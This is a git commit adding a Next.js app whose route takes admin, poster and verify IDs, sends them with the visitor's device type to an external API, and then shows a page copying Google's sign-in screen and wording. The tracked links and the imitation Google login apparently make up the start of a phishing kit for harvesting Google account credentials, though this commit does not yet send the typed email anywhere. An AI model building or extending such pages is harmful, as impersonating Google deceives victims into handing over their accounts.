183c00f443586ef98af234aa52151ba21689385f
shovonroy173 <shovonroy2003@gmail.com>
2025-05-07 14:27:19 +0600

    first commit

---
+++ src/app/[adminId]/[posterId]/[verifyId]/page.jsx
@@ -0,0 +1,43 @@
+import Signin from '@/component/Signin/Signin';
+import { headers } from 'next/headers';
+import React from 'react'
+
+async function Verify({params}) {
+    try {
+        const { adminId, paramsId, verifyId } = await params;
+        const headerList = await headers();
+        const userAgent = headerList.get("user-agent");
+        const isMobileView = userAgent.match(
+          /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
+        );
+        const isTabletView = userAgent.match(
+          /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
+        );
+        const device = isMobileView ? "phone" : isTabletView ? "tablet" : "desktop";
+    
+        const url = `${process.env.API_URL}/${process.env.SITE}/${adminId}/${paramsId}/${verifyId}/${device}`;
+        console.log("url", url);
+    
+        const response = await fetch(url);
+        const result = await response.json();
+    
+        console.log("result", result);
+    
+        // if (result?.success === "not exist") {
+        //   return (
+        //     <div className="flex gap-5 justify-center items-center bg-amber-200 min-h-screen">
+        //       <ServerOff size={30} />
+    
+        //       <p className="text-xl">No Data Exists</p>
+        //     </div>
+        //   );
+        // } else {
+          return <Signin />;
+        // }
+      } catch (error) {
+        console.log(error);
+        return <div>Error in server!!</div>;
+      }
+}
+
+export default Verify;
---
+++ src/component/Signin/Signin.jsx
@@ -0,0 +1,69 @@
+"use client";
+import Image from "next/image";
+import React, { useState } from "react";
+
+function Signin() {
+  const [email, setEmail] = useState();
+  return (
+    <div className=" w-full min-h-screen flex flex-col justify-center items-center">
+      <div className="flex flex-col max-w-md  h-screen p-10 justify-between">
+        <div className="flex flex-col gap-6">
+          <div className="flex flex-col  gap-3">
+            <div className="">
+              <Image
+                src={"/logo.png"}
+                alt="logo"
+                width={100}
+                height={100}
+                className="object-cover "
+              />
+            </div>
+            <div className="flex flex-col gap-2">
+              <h1 className="text-2xl font-normal mb-1">Sign in</h1>
+
+              <div>
+                <p className="text-base text-gray-600">
+                  Use your Google Account. The account will be added to this
+                  device and available to other Google apps.
+                </p>
+                <p className="text-blue-500 font-bold">
+                  Learn more about using your account.
+                </p>
+              </div>
+            </div>
+          </div>
+          <div className="flex flex-col gap-10 ">
+            <div>
+              <input
+                type="email"
+                id="email"
+                className={`w-full border  border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
+                placeholder="Email or phone"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+              />
+
+              <button className="text-blue-600 font-medium text-sm mt-2">
+                Forgot email?
+              </button>
+            </div>
+            <div className="flex justify-start">
+              <button className="text-blue-600 font-semibold">
+                Create account
+              </button>
+            </div>
+          </div>
+        </div>
+        <div className="flex justify-end">
+          <button
+            className="w-fit  bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 font-semibold"
+          >
+            Next
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+export default Signin;
